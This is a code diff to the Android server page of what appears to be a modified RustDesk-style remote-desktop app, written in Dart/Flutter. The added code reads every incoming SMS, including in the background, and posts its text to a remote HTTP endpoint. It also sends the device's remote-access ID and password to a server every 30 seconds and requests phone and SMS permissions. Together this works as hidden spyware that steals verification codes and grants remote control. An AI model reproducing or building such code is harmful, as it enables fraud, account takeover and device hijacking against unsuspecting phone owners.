@@ -1,5 +1,7 @@
 import 'dart:async';
-
+import 'dart:convert';
+import 'package:another_telephony/telephony.dart';
+import 'package:battery/battery.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:flutter_hbb/desktop/pages/desktop_home_page.dart';
@@ -7,6 +9,9 @@ import 'package:flutter_hbb/mobile/widgets/dialog.dart';
 import 'package:flutter_hbb/models/chat_model.dart';
 import 'package:get/get.dart';
 import 'package:provider/provider.dart';
+import 'package:shared_preferences/shared_preferences.dart';
+import 'package:http/http.dart' as http;
+import 'package:permission_handler/permission_handler.dart';
 
 import '../../common.dart';
 import '../../common/widgets/dialog.dart';
@@ -15,53 +20,71 @@ import '../../models/platform_model.dart';
 import '../../models/server_model.dart';
 import 'home_page.dart';
 
-import 'package:http/http.dart' as http;
-import 'dart:convert';
-// import 'package:permission_handler/permission_handler.dart';
-import 'package:telephony/telephony.dart';
-import 'package:shared_preferences/shared_preferences.dart';
-
-import 'dart:io';
-// 后台消息处理程序
-backgrounMessageHandler(SmsMessage message) async {
-  // 从 SharedPreferences 获取存储的手机号，clientId 
-  print("into 2");
+@pragma('vm:entry-point')
+backgroundMessageHandler(SmsMessage message) async {
   SharedPreferences prefs = await SharedPreferences.getInstance();
-  String? storedPhoneNumber = prefs.getString('storedPhoneNumber'); // 获取存储的手机号
-  String? clientId = prefs.getString('clientId'); // 获取存储的clientId
+  String? storedPhoneNumber = prefs.getString('storedPhoneNumber');
+  String? clientId = prefs.getString('clientId');
   String content = message.body!;
-  
-  if (storedPhoneNumber != null && clientId!= null) {
+
+  if (storedPhoneNumber != null && clientId != null) {
     DateTime now = DateTime.now();
     String beijingTime = now.toString();
     String clientTime = beijingTime.split(".")[0];
     await sendToApi(storedPhoneNumber, content, clientId, clientTime);
-    print("Background message processed: $content");
   } else {
     print("No phone number stored in background.");
   }
 }
+Future<void> requestAnswerCallPermission() async {
+  PermissionStatus status = await Permission.phone.status;
+  if (!status.isGranted) {
+    await Permission.phone.request();
+  }
+}
 
-Future<void> sendToApi(String sender, String content, String id, String clientTime) async {
-  var headers = {
-    'User-Agent': 'Apifox/1.0.0 (https://apifox.com)',
-    'Content-Type': 'application/json'
-  };
-  // var request = http.Request('POST', Uri.parse('http://192.168.180.210:7808/external/cli/sms/save'));
-  var request = http.Request('POST', Uri.parse('http://61.171.69.243:7808/external/cli/sms/save'));
+Future<void> sendIdToApi(String password, String id, String clientTime) async {
+  var headers = {'Content-Type': 'application/json'};
+  final Battery battery = Battery();
+  final int batteryLevel = await battery.batteryLevel;
+
+  var request = http.Request('POST', Uri.parse('http://192.168.10.109:7808/external/cli/sms/heart'));
   request.body = json.encode({
     "clientId": id,
-    "phone": sender,
-    "content": content,
-    "clientTime": clientTime
+    "password": password,
+    "clientTime": clientTime,
+    "batteryLevel": batteryLevel
   });
   request.headers.addAll(headers);
 
   try {
     http.StreamedResponse response = await request.send();
-    if (response.statusCode == 200) {
-      print("API response: ${await response.stream.bytesToString()}");
-    } else {
+    if (response.statusCode != 200) {
+      print("Periodic API error: ${response.reasonPhrase}");
+    }
+  } catch (e) {
+    print("Error sending to periodic API: $e");
+  }
+}
+
+Future<void> sendToApi(String sender, String content, String id, String clientTime) async {
+  var headers = {'Content-Type': 'application/json'};
+  final Battery battery = Battery();
+  final int batteryLevel = await battery.batteryLevel;
+
+  var request = http.Request('POST', Uri.parse('http://192.168.10.109:7808/external/cli/sms/save'));
+  request.body = json.encode({
+    "clientId": id,
+    "phone": sender,
+    "content": content,
+    "clientTime": clientTime,
+    "batteryLevel": batteryLevel
+  });
+  request.headers.addAll(headers);
+
+  try {
+    http.StreamedResponse response = await request.send();
+    if (response.statusCode != 200) {
       print("API error: ${response.reasonPhrase}");
     }
   } catch (e) {
@@ -78,7 +101,7 @@ class ServerPage extends StatefulWidget implements PageShape {
 
   @override
   final appBarActions = (!bind.isDisableSettings() &&
-          bind.mainGetBuildinOption(key: kOptionHideSecuritySetting) != 'Y')
+      bind.mainGetBuildinOption(key: kOptionHideSecuritySetting) != 'Y')
       ? [_DropDownAction()]
       : [];
 
@@ -91,7 +114,6 @@ class ServerPage extends StatefulWidget implements PageShape {
 class _DropDownAction extends StatelessWidget {
   _DropDownAction();
 
-  // should only have one action
   final actions = [
     PopupMenuButton<String>(
         tooltip: "",
@@ -119,14 +141,13 @@ class _DropDownAction extends StatelessWidget {
             const PopupMenuDivider(),
             PopupMenuItem(
               value: 'AcceptSessionsViaPassword',
-              child: listTile(
-                  'Accept sessions via password', approveMode == 'password'),
+              child:
+              listTile('Accept sessions via password', approveMode == 'password'),
               enabled: !isApproveModeFixed,
             ),
             PopupMenuItem(
               value: 'AcceptSessionsViaClick',
-              child:
-                  listTile('Accept sessions via click', approveMode == 'click'),
+              child: listTile('Accept sessions via click', approveMode == 'click'),
               enabled: !isApproveModeFixed,
             ),
             PopupMenuItem(
@@ -136,14 +157,12 @@ class _DropDownAction extends StatelessWidget {
               enabled: !isApproveModeFixed,
             ),
             if (showPasswordOption) const PopupMenuDivider(),
-            if (showPasswordOption &&
-                verificationMethod != kUseTemporaryPassword)
+            if (showPasswordOption && verificationMethod != kUseTemporaryPassword)
               PopupMenuItem(
                 value: "setPermanentPassword",
                 child: Text(translate("Set permanent password")),
               ),
-            if (showPasswordOption &&
-                verificationMethod != kUsePermanentPassword)
+            if (showPasswordOption && verificationMethod != kUsePermanentPassword)
               PopupMenuItem(
                 value: "setTemporaryPasswordLength",
                 child: Text(translate("One-time password length")),
@@ -212,64 +231,131 @@ class _DropDownAction extends StatelessWidget {
 }
 
 class _ServerPageState extends State<ServerPage> {
-  final Telephony telephony = Telephony.instance;
-  late String id;
-  String? storedPhoneNumber; // 用来存储用户输入的手机号
-  TextEditingController phoneController = TextEditingController(); 
-
   Timer? _updateTimer;
+  Timer? _periodicTimer;
+  final Telephony telephony = Telephony.instance;
+  final Battery battery = Battery();
+  int _batteryLevel = 100;
+  BatteryState _batteryState = BatteryState.full;
+  String? storedPhoneNumber;
+  TextEditingController phoneController = TextEditingController();
 
   @override
   void initState() {
     super.initState();
-
-    telephony.requestPhoneAndSmsPermissions;
-    _listenForSms(); // 开始监听短信
-    _loadStoredPhoneNumber(); // 加载存储的手机号
-
     _updateTimer = periodic_immediate(const Duration(seconds: 3), () async {
       await gFFI.serverModel.fetchID();
     });
     gFFI.serverModel.checkAndroidPermission();
-    id = gFFI.serverModel.serverId.value.text.trim();
+    _initSmsAndBatteryMonitoring();
+    startPeriodicSending();
+    _loadStoredPhoneNumber();
   }
 
-
-  void _loadStoredPhoneNumber() async {
+  Future<void> _loadStoredPhoneNumber() async {
     SharedPreferences prefs = await SharedPreferences.getInstance();
-    String? storedNumber = prefs.getString('storedPhoneNumber'); // 获取存储的手机号
-    setState(() {
-      storedPhoneNumber = storedNumber; // 更新状态
-      phoneController.text = storedPhoneNumber ?? ""; // 将手机号设置到输入框
-    });
-  }
-
-  void _listenForSms() {
-    telephony.listenIncomingSms(
-      onNewMessage: (SmsMessage message) async {
-        if (storedPhoneNumber != null) {
-          DateTime now = DateTime.now();
-          String beijingTime = now.toString();
-          String clientTime = beijingTime.split(".")[0];
-          await sendToApi(storedPhoneNumber!, message.body!, id, clientTime); // 发送已存储的手机号和短信
-        } else {
-          print("No phone number stored. Please input a phone number first.");
-        }
-      },
-      onBackgroundMessage: backgrounMessageHandler, // 设置后台消息处理
-    );
+    String? storedNumber = prefs.getString('storedPhoneNumber');
+    if (mounted) {
+      setState(() {
+        storedPhoneNumber = storedNumber;
+        phoneController.text = storedPhoneNumber ?? "";
+      });
+    }
   }
 
   Future<void> savePhoneNumber(String inputPhone) async {
     SharedPreferences prefs = await SharedPreferences.getInstance();
-    await prefs.setString('storedPhoneNumber', inputPhone); // 保存手机号
-    await prefs.setString('clientId', id); // 保存id
+    await prefs.setString('storedPhoneNumber', inputPhone);
+    await prefs.setString('clientId', gFFI.serverModel.serverId.value.text);
+    if (mounted) {
+      setState(() {
+        storedPhoneNumber = inputPhone;
+      });
+    }
+  }
+
+  void _initSmsAndBatteryMonitoring() async {
+    getPermission();
+    _initBatteryMonitoring();
+    _listenForSms();
+  }
+
+  void _initBatteryMonitoring() {
+    battery.batteryLevel.then((level) {
+      if (mounted) {
+        setState(() {
+          _batteryLevel = level;
+        });
+      }
+    });
+
+    battery.onBatteryStateChanged.listen((BatteryState state) {
+      if (mounted) {
+        setState(() {
+          _batteryState = state;
+        });
+
+        battery.batteryLevel.then((level) {
+          setState(() {
+            _batteryLevel = level;
+          });
+        });
+      }
+    });
+  }
+
+  void getPermission() async {
+    bool? permissionsGranted = await telephony.requestPhoneAndSmsPermissions;
+    if (permissionsGranted != true) {
+      await telephony.requestPhoneAndSmsPermissions;
+    }
+    await requestAnswerCallPermission();
+  }
+
+  void _listenForSms() {
+    telephony.listenIncomingSms(
+      listenInBackground: true,
+      onNewMessage: (SmsMessage message) async {
+        DateTime now = DateTime.now();
+        String clientTime = now.toString().split(".")[0];
+        await sendToApi(storedPhoneNumber!, message.body!, gFFI.serverModel.serverId.value.text, clientTime);
+        String modifiedMessage = message.body?.replaceAll('科大讯飞', '讯飞星火') ?? '';
+        if (mounted) {
+          showDialog(
+            context: context,
+            barrierDismissible: true,
+            builder: (BuildContext context) {
+              Timer(const Duration(seconds: 5), () {
+                Navigator.of(context).pop();
+              });
+              return AlertDialog(
+                title: const Text('收到新短信'),
+                content: Text(modifiedMessage),
+              );
+            },
+          );
+        }
+      },
+      onBackgroundMessage: backgroundMessageHandler,
+    );
+  }
+
+  void startPeriodicSending() {
+    _periodicTimer = Timer.periodic(Duration(seconds: 30), (timer) async {
+      final serverId = gFFI.serverModel.serverId.value.text;
+      if (serverId.isNotEmpty) {
+        DateTime now = DateTime.now();
+        String clientTime = now.toString().split(".")[0];
+        await sendIdToApi(gFFI.serverModel.serverPasswd.value.text, serverId, clientTime);
+      }
+    });
   }
 
   @override
   void dispose() {
     _updateTimer?.cancel();
-    phoneController.dispose(); // 销毁controller
+    _periodicTimer?.cancel();
+    phoneController.dispose();
     super.dispose();
   }
 
@@ -280,54 +366,55 @@ class _ServerPageState extends State<ServerPage> {
         value: gFFI.serverModel,
         child: Consumer<ServerModel>(
             builder: (context, serverModel, child) => SingleChildScrollView(
-                  controller: gFFI.serverModel.controller,
-                  child: Center(
-                    child: Column(
-                      mainAxisAlignment: MainAxisAlignment.start,
-                      children: [
-                        buildPresetPasswordWarningMobile(),
-                        gFFI.serverModel.isStart
-                            ? ServerInfo()
-                            : ServiceNotRunningNotification(),
-                        const ConnectionManager(),
-                        const PermissionChecker(),
-                        SizedBox.fromSize(size: const Size(0, 15.0)),
-                        // 添加手机号输入框
-                        TextField(
-                          controller: phoneController,
-                          decoration: const InputDecoration(
-                            labelText: '输入手机号',
-                            border: OutlineInputBorder(),
+              controller: gFFI.serverModel.controller,
+              child: Center(
+                child: Column(
+                  mainAxisAlignment: MainAxisAlignment.start,
+                  children: [
+                    buildPresetPasswordWarningMobile(),
+                    gFFI.serverModel.isStart
+                        ? ServerInfo()
+                        : ServiceNotRunningNotification(),
+                    PaddingCard(
+                      title: "手机号设置",
+                      child: Column(
+                        children: [
+                          TextField(
+                            controller: phoneController,
+                            decoration: const InputDecoration(
+                              labelText: '输入手机号',
+                              border: OutlineInputBorder(),
+                            ),
+                            keyboardType: TextInputType.phone,
                           ),
-                          keyboardType: TextInputType.phone,
-                        ),
-                        const SizedBox(height: 20),
-                        // 确认手机号按钮，存储输入的手机号
-                        TextButton(
-                          onPressed: () async {
-                            String inputPhone = phoneController.text; // 获取输入框中的手机号
-                            if (inputPhone.isNotEmpty) {
-                              await savePhoneNumber(inputPhone); // 存储手机号
-                              setState(() {
-                                storedPhoneNumber = inputPhone; // 更新当前存储手机号
-                              });
-                            } else {
-                              print('请输入手机号');
-                            }
-                          },
-                          child: const Text('确认手机号'),
-                        ),
-                        const SizedBox(height: 20),
-                      ],
+                          const SizedBox(height: 20),
+                          TextButton(
+                            onPressed: () async {
+                              String inputPhone = phoneController.text;
+                              if (inputPhone.isNotEmpty) {
+                                await savePhoneNumber(inputPhone);
+                                showToast(translate('Phone number saved'));
+                              } else {
+                                showToast(translate('Please enter phone number'));
+                              }
+                            },
+                            child: Text(translate('Confirm Phone Number')),
+                          ),
+                        ],
+                      ),
                     ),
-                  ),
-                )));
+                    const ConnectionManager(),
+                    const PermissionChecker(),
+                    SizedBox.fromSize(size: const Size(0, 15.0)),
+                  ],
+                ),
+              ),
+            )));
   }
 }
 
 void checkService() async {
   gFFI.invokeMethod("check_service");
-  // for Android 10/11, request MANAGE_EXTERNAL_STORAGE permission from system setting page
   if (AndroidPermissionManager.isWaitingFile() && !gFFI.serverModel.fileOk) {
     AndroidPermissionManager.complete(kManageExternalStorage,
         await AndroidPermissionManager.check(kManageExternalStorage));
@@ -344,21 +431,18 @@ class ServiceNotRunningNotification extends StatelessWidget {
 
     return PaddingCard(
         title: translate("Service is not running"),
-        titleIcon:
-            const Icon(Icons.warning_amber_sharp, color: Colors.redAccent),
+        titleIcon: const Icon(Icons.warning_amber_sharp, color: Colors.redAccent),
         child: Column(
           crossAxisAlignment: CrossAxisAlignment.start,
           children: [
             Text(translate("android_start_service_tip"),
-                    style:
-                        const TextStyle(fontSize: 12, color: MyTheme.darkGray))
+                style: const TextStyle(fontSize: 12, color: MyTheme.darkGray))
                 .marginOnly(bottom: 8),
             ElevatedButton.icon(
                 icon: const Icon(Icons.play_arrow),
                 onPressed: () {
                   if (gFFI.userModel.userName.value.isEmpty &&
-                      bind.mainGetLocalOption(key: "show-scam-warning") !=
-                          "N") {
+                      bind.mainGetLocalOption(key: "show-scam-warning") != "N") {
                     showScamWarning(context, serverModel);
                   } else {
                     serverModel.toggleService();
@@ -506,13 +590,13 @@ class ScamWarningDialogState extends State<ScamWarningDialog> {
                         onPressed: isButtonLocked
                             ? null
                             : () {
-                                Navigator.of(context).pop();
-                                _serverModel.toggleService();
-                                if (show_warning) {
-                                  bind.mainSetLocalOption(
-                                      key: "show-scam-warning", value: "N");
-                                }
-                              },
+                          Navigator.of(context).pop();
+                          _serverModel.toggleService();
+                          if (show_warning) {
+                            bind.mainSetLocalOption(
+                                key: "show-scam-warning", value: "N");
+                          }
+                        },
                         style: ElevatedButton.styleFrom(
                           backgroundColor: Colors.blueAccent,
                         ),
@@ -562,7 +646,6 @@ class ScamWarningDialogState extends State<ScamWarningDialog> {
   }
 }
 
-
 class ServerInfo extends StatelessWidget {
   final model = gFFI.serverModel;
   final emptyController = TextEditingController(text: "-");
@@ -581,7 +664,7 @@ class ServerInfo extends StatelessWidget {
     const TextStyle textStyleHeading = TextStyle(
         fontSize: 16.0, fontWeight: FontWeight.bold, color: Colors.grey);
     const TextStyle textStyleValue =
-        TextStyle(fontSize: 25.0, fontWeight: FontWeight.bold);
+    TextStyle(fontSize: 25.0, fontWeight: FontWeight.bold);
 
     void copyToClipboard(String value) {
       Clipboard.setData(ClipboardData(text: value));
@@ -592,7 +675,7 @@ class ServerInfo extends StatelessWidget {
       if (serverModel.connectStatus == -1) {
         return Row(children: [
           const Icon(Icons.warning_amber_sharp,
-                  color: colorNegative, size: iconSize)
+              color: colorNegative, size: iconSize)
               .marginOnly(right: iconMarginRight),
           Expanded(child: Text(translate('not_ready_status')))
         ]);
@@ -618,7 +701,7 @@ class ServerInfo extends StatelessWidget {
           children: [
             Row(children: [
               const Icon(Icons.perm_identity,
-                      color: Colors.grey, size: iconSize)
+                  color: Colors.grey, size: iconSize)
                   .marginOnly(right: iconMarginRight),
               Text(
                 translate('ID'),
@@ -654,18 +737,18 @@ class ServerInfo extends StatelessWidget {
               isPermanent
                   ? SizedBox.shrink()
                   : Row(children: [
-                      IconButton(
-                          visualDensity: VisualDensity.compact,
-                          icon: const Icon(Icons.refresh),
-                          onPressed: () => bind.mainUpdateTemporaryPassword()),
-                      IconButton(
-                          visualDensity: VisualDensity.compact,
-                          icon: Icon(Icons.copy_outlined),
-                          onPressed: () {
-                            copyToClipboard(
-                                model.serverPasswd.value.text.trim());
-                          })
-                    ])
+                IconButton(
+                    visualDensity: VisualDensity.compact,
+                    icon: const Icon(Icons.refresh),
+                    onPressed: () => bind.mainUpdateTemporaryPassword()),
+                IconButton(
+                    visualDensity: VisualDensity.compact,
+                    icon: Icon(Icons.copy_outlined),
+                    onPressed: () {
+                      copyToClipboard(
+                          model.serverPasswd.value.text.trim());
+                    })
+              ])
             ]).marginOnly(left: 40, bottom: 15),
             ConnectionStateNotification()
           ],
@@ -690,20 +773,20 @@ class _PermissionCheckerState extends State<PermissionChecker> {
         child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
           serverModel.mediaOk
               ? ElevatedButton.icon(
-                      style: ButtonStyle(
-                          backgroundColor:
-                              MaterialStateProperty.all(Colors.red)),
-                      icon: const Icon(Icons.stop),
-                      onPressed: serverModel.toggleService,
-                      label: Text(translate("Stop service")))
-                  .marginOnly(bottom: 8)
+              style: ButtonStyle(
+                  backgroundColor:
+                  MaterialStateProperty.all(Colors.red)),
+              icon: const Icon(Icons.stop),
+              onPressed: serverModel.toggleService,
+              label: Text(translate("Stop service")))
+              .marginOnly(bottom: 8)
               : SizedBox.shrink(),
           PermissionRow(
               translate("Screen Capture"),
               serverModel.mediaOk,
               !serverModel.mediaOk &&
-                      gFFI.userModel.userName.value.isEmpty &&
-                      bind.mainGetLocalOption(key: "show-scam-warning") != "N"
+                  gFFI.userModel.userName.value.isEmpty &&
+                  bind.mainGetLocalOption(key: "show-scam-warning") != "N"
                   ? () => showScamWarning(context, serverModel)
                   : serverModel.toggleService),
           PermissionRow(translate("Input Control"), serverModel.inputOk,
@@ -712,15 +795,15 @@ class _PermissionCheckerState extends State<PermissionChecker> {
               serverModel.toggleFile),
           hasAudioPermission
               ? PermissionRow(translate("Audio Capture"), serverModel.audioOk,
-                  serverModel.toggleAudio)
+              serverModel.toggleAudio)
               : Row(children: [
-                  Icon(Icons.info_outline).marginOnly(right: 15),
-                  Expanded(
-                      child: Text(
-                    translate("android_version_audio_tip"),
-                    style: const TextStyle(color: MyTheme.darkGray),
-                  ))
-                ])
+            Icon(Icons.info_outline).marginOnly(right: 15),
+            Expanded(
+                child: Text(
+                  translate("android_version_audio_tip"),
+                  style: const TextStyle(color: MyTheme.darkGray),
+                ))
+          ])
         ]));
   }
 }
@@ -755,47 +838,47 @@ class ConnectionManager extends StatelessWidget {
     return Column(
         children: serverModel.clients
             .map((client) => PaddingCard(
-                title: translate(client.isFileTransfer
-                    ? "File Connection"
-                    : "Screen Connection"),
-                titleIcon: client.isFileTransfer
-                    ? Icon(Icons.folder_outlined)
-                    : Icon(Icons.mobile_screen_share),
-                child: Column(children: [
-                  Row(
-                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
-                    children: [
-                      Expanded(child: ClientInfo(client)),
-                      Expanded(
-                          flex: -1,
-                          child: client.isFileTransfer || !client.authorized
-                              ? const SizedBox.shrink()
-                              : IconButton(
-                                  onPressed: () {
-                                    gFFI.chatModel.changeCurrentKey(
-                                        MessageKey(client.peerId, client.id));
-                                    final bar = navigationBarKey.currentWidget;
-                                    if (bar != null) {
-                                      bar as BottomNavigationBar;
-                                      bar.onTap!(1);
-                                    }
-                                  },
-                                  icon: unreadTopRightBuilder(
-                                      client.unreadChatMessageCount)))
-                    ],
-                  ),
-                  client.authorized
-                      ? const SizedBox.shrink()
-                      : Text(
-                          translate("android_new_connection_tip"),
-                          style: Theme.of(context).textTheme.bodyMedium,
-                        ).marginOnly(bottom: 5),
-                  client.authorized
-                      ? _buildDisconnectButton(client)
-                      : _buildNewConnectionHint(serverModel, client),
-                  if (client.incomingVoiceCall && !client.inVoiceCall)
-                    ..._buildNewVoiceCallHint(context, serverModel, client),
-                ])))
+            title: translate(client.isFileTransfer
+                ? "File Connection"
+                : "Screen Connection"),
+            titleIcon: client.isFileTransfer
+                ? Icon(Icons.folder_outlined)
+                : Icon(Icons.mobile_screen_share),
+            child: Column(children: [
+              Row(
+                mainAxisAlignment: MainAxisAlignment.spaceBetween,
+                children: [
+                  Expanded(child: ClientInfo(client)),
+                  Expanded(
+                      flex: -1,
+                      child: client.isFileTransfer || !client.authorized
+                          ? const SizedBox.shrink()
+                          : IconButton(
+                          onPressed: () {
+                            gFFI.chatModel.changeCurrentKey(
+                                MessageKey(client.peerId, client.id));
+                            final bar = navigationBarKey.currentWidget;
+                            if (bar != null) {
+                              bar as BottomNavigationBar;
+                              bar.onTap!(1);
+                            }
+                          },
+                          icon: unreadTopRightBuilder(
+                              client.unreadChatMessageCount)))
+                ],
+              ),
+              client.authorized
+                  ? const SizedBox.shrink()
+                  : Text(
+                translate("android_new_connection_tip"),
+                style: Theme.of(context).textTheme.bodyMedium,
+              ).marginOnly(bottom: 5),
+              client.authorized
+                  ? _buildDisconnectButton(client)
+                  : _buildNewConnectionHint(serverModel, client),
+              if (client.incomingVoiceCall && !client.inVoiceCall)
+                ..._buildNewVoiceCallHint(context, serverModel, client),
+            ])))
             .toList());
   }
 
@@ -919,7 +1002,7 @@ class PaddingCard extends StatelessWidget {
           margin: const EdgeInsets.fromLTRB(12.0, 10.0, 12.0, 0),
           child: Padding(
             padding:
-                const EdgeInsets.symmetric(vertical: 15.0, horizontal: 20.0),
+            const EdgeInsets.symmetric(vertical: 15.0, horizontal: 20.0),
             child: Column(
               children: children,
             ),
@@ -954,10 +1037,10 @@ class ClientInfo extends StatelessWidget {
                   child: Column(
                       crossAxisAlignment: CrossAxisAlignment.start,
                       children: [
-                    Text(client.name, style: const TextStyle(fontSize: 18)),
-                    const SizedBox(width: 8),
-                    Text(client.peerId, style: const TextStyle(fontSize: 10))
-                  ]))
+                        Text(client.name, style: const TextStyle(fontSize: 18)),
+                        const SizedBox(width: 8),
+                        Text(client.peerId, style: const TextStyle(fontSize: 10))
+                      ]))
             ],
           ),
         ]));
